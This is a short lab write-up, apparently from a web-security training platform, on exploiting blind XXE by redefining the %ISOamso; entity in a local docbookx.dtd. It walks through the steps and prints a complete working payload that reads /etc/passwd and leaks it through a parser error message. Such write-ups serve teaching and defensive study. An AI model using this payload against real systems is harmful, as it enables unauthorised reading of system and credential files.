# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

| **Category** | Web Security / XXE Injection |
| :--- | :--- |
| **Vulnerability Type** | Blind XXE (Local DTD Repurposing) |
| **Goal** | Retrieve `/etc/passwd` when external connections (OOB) are blocked. |
| **Tools Used** | Burp Suite |
| **Status** | ✅ Solved |

## Conceptual Overview
When an application blocks external network interactions (preventing standard OOB XXE), attackers can trigger error-based XXE by repurposing an existing Local DTD file on the server's filesystem.

By redefining a parameter entity (like `%ISOamso;`) defined within a standard DTD (like `docbookx.dtd`), i can inject malicious code that executes when the local DTD is parsed.

## Exploitation Steps

### Phase 1: Identifying the Barrier
Attempting to fetch an external DTD from a collaborator server failed, indicating outbound traffic is blocked.

### Phase 2: Locating a Local DTD
I targeted a common Linux DTD file located at `/usr/share/yelp/dtd/docbookx.dtd`.

### Phase 3: The Payload (Entity Redefinition)
I constructed a payload to:
1.  Load the local `docbookx.dtd`.
2.  Overwrite the `%ISOamso;` entity inside it with our error-based exploit code.
3.  Use HTML entities (`&#x25;`) to bypass nesting restrictions.

**Payload:**
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```